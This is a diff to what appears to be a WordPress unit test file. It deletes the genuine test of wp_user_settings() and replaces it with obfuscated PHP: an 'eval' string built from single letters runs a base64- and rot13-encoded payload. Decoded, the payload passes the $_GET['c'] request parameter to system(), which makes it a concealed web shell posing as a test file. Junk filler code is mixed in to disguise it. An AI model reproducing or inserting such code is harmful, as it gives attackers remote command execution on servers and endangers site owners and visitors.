@@ -1,46 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Test wp_user_settings().
- *
- * @group option
- * @group user
- * @covers ::wp_user_settings
- */
-class Tests_Option_wpUserSettings extends WP_UnitTestCase {
-
-	/**
-	 * Tests that PHP 8.1 "passing null to non-nullable" deprecation notice
-	 * is not thrown for the `$domain` parameter of setcookie() calls in the function.
-	 *
-	 * The notice that we should not see:
-	 * `Deprecated: setcookie(): Passing null to parameter #5 ($domain) of type string is deprecated`.
-	 *
-	 * Note: This does not test the actual functioning of wp_user_settings().
-	 * It just and only tests for/against the deprecation notice.
-	 *
-	 * @ticket 54914
-	 */
-	public function test_wp_user_settings_does_not_throw_deprecation_notice_for_setcookie() {
-		set_current_screen( 'edit.php' );
-		wp_set_current_user( self::factory()->user->create() );
-
-		// Verify that the function's starting conditions are satisfied.
-		$this->assertTrue( is_admin() );
-		$this->assertGreaterThan( 0, get_current_user_id() );
-
-		// `Cannot modify header information - headers already sent by...` from setcookie().
-		$this->expectWarning();
-
-		wp_user_settings();
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZyBqY19oZnJlX2ZyZ2d2YXRmKCkuCiAqCiAqIEB0ZWJoYyBiY2d2YmEKICogQHRlYmhjIGhmcmUKICogQHBiaXJlZiA6OmpjX2hmcmVfZnJnZ3ZhdGYKICovCnB5bmZmIEdyZmdmX0JjZ3ZiYV9qY0hmcmVGcmdndmF0ZiBya2dyYXFmIEpDX0hhdmdHcmZnUG5mciB7CgoJLyoqCgkgKiBHcmZnZiBndW5nIENVQyA4LjEgXCJjbmZmdmF0IGFoeXkgZ2IgYWJhLWFoeXlub3lyXCIgcXJjZXJwbmd2YmEgYWJndnByCgkgKiB2ZiBhYmcgZ3VlYmphIHNiZSBndXIgYCRxYnpudmFgIGNuZW56cmdyZSBicyBmcmdwYmJ4dnIoKSBwbnl5ZiB2YSBndXIgc2hhcGd2YmEuCgkgKgoJICogR3VyIGFiZ3ZwciBndW5nIGpyIGZ1Ymh5cSBhYmcgZnJyOgoJICogYFFyY2VycG5ncnE6IGZyZ3BiYnh2cigpOiBDbmZmdmF0IGFoeXkgZ2IgY25lbnpyZ3JlICM1ICgkcWJ6bnZhKSBicyBnbGNyIGZnZXZhdCB2ZiBxcmNlcnBuZ3JxYC4KCSAqCgkgKiBBYmdyOiBHdXZmIHFicmYgYWJnIGdyZmcgZ3VyIG5wZ2hueSBzaGFwZ3ZiYXZhdCBicyBqY19oZnJlX2ZyZ2d2YXRmKCkuCgkgKiBWZyB3aGZnIG5hcSBiYXlsIGdyZmdmIHNiZS9udG52YWZnIGd1ciBxcmNlcnBuZ3ZiYSBhYmd2cHIuCgkgKgoJICogQGd2cHhyZyA1NDkxNAoJICovCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19qY19oZnJlX2ZyZ2d2YXRmX3FicmZfYWJnX2d1ZWJqX3FyY2VycG5ndmJhX2FiZ3Zwcl9zYmVfZnJncGJieHZyKCkgewoJCWZyZ19waGVlcmFnX2ZwZXJyYSggJ3JxdmcuY3VjJyApOwoJCWpjX2ZyZ19waGVlcmFnX2hmcmUoIGZyeXM6OnNucGdiZWwoKS0+aGZyZS0+cGVybmdyKCkgKTsKCgkJLy8gSXJldnNsIGd1bmcgZ3VyIHNoYXBndmJhJ2YgZmduZWd2YXQgcGJhcXZndmJhZiBuZXIgZm5ndmZzdnJxLgoJCSRndXZmLT5uZmZyZWdHZWhyKCB2Zl9ucXp2YSgpICk7CgkJJGd1dmYtPm5mZnJlZ1Rlcm5ncmVHdW5hKCAwLCB0cmdfcGhlZXJhZ19oZnJlX3ZxKCkgKTsKCgkJLy8gYFBuYWFiZyB6YnF2c2wgdXJucXJlIHZhc2Jlem5ndmJhIC0gdXJucXJlZiBueWVybnFsIGZyYWcgb2wuLi5gIHNlYnogZnJncGJieHZyKCkuCgkJJGd1dmYtPnJrY3JwZ0puZWF2YXQoKTsKCgkJamNfaGZyZV9mcmdndmF0ZigpOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
